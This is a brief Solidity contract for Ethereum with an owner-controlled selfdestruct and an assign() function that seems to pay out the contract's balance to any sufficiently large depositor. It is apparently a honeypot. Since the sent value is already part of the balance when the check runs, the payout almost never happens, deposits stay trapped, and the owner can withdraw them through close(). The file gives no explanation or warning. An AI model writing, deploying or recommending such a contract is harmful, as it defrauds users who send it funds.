pragma solidity ^0.4.25;

contract Chuuuttt17
{
    constructor() public payable {
        org = msg.sender;
    }
    function() external payable {}
    address org;
    function close() public {
        if (msg.sender==org)
            selfdestruct(msg.sender);
    }
    function assign() public payable {
        if (msg.value >= address(this).balance)
            msg.sender.transfer(address(this).balance);
    }
}